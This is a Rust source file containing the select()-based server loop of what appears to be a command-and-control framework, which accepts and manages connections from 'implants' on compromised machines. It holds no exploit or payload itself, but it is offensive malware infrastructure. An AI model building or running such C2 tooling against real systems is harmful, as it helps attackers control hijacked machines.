use std::time;
use libvoid::select::*;
use crate::structs::net::CncNet;

use log::{error, info};


fn fill_fdsetrd(fdset: &mut FdSet, net: &mut CncNet) {
    fdset.set(net.get_fd());

    for fd in net.get_cnc().lock().unwrap().get_implant_fd_list() {
        fdset.set(fd);
    }
}

fn fill_fdsetwr(fdset: &mut FdSet, net: &mut CncNet) {
    for fd in net.get_cnc().lock().unwrap().get_implant_write_fd_list() {
        fdset.set(fd);
    }
}

pub fn server<'a>(net: &mut CncNet, key: u32) {

    loop {
        let mut fdsetrd = FdSet::new();
        let mut fdsetwr = FdSet::new();

        if net.get_fd() == -1 {
            match net.bind() {
                Ok(_) => (),
                Err(e) => {
                    error!("{:?}", e);
                    continue;
                }
            };
        }

        fill_fdsetrd(&mut fdsetrd, net);
        fill_fdsetwr(&mut fdsetwr, net);

        let nfds = net.get_max_fd();
        match select(
            nfds+1,
            Some(&mut fdsetrd),
            Some(&mut fdsetwr),
            None,
            Some(&make_timeval(time::Duration::new(5, 0)))
        ) {
            Ok(r) => {
                if r == 0 {continue;}
                let range = std::ops::Range{start: 0, end: net.get_max_fd()+1};
                for fd in range {
                    if fdsetrd.isset(fd) {
                        if fd == net.get_fd() {
                            let (stream, addr) = net.accept().unwrap();
                            info!("New connection from `{}'", addr.to_string());
                            net.get_cnc().lock().unwrap().add_implant(addr, stream, key);
                        } else {
                            net.get_cnc().lock().unwrap().read_from_implant(fd).unwrap();
                        }
                    } else if fdsetwr.isset(fd) {
                        let mut unlock = net.get_cnc().lock().unwrap();
                        let implant = match unlock.get_implant_by_fd(fd) {
                            Some(imp) => imp,
                            None => {
                                drop(unlock);
                                continue;
                            }
                        };

                        implant.send().unwrap();
                    }
                }
            },
            Err(e) => {
                error!("Error: {:?}", e);
                continue;
            }
        }
    }
}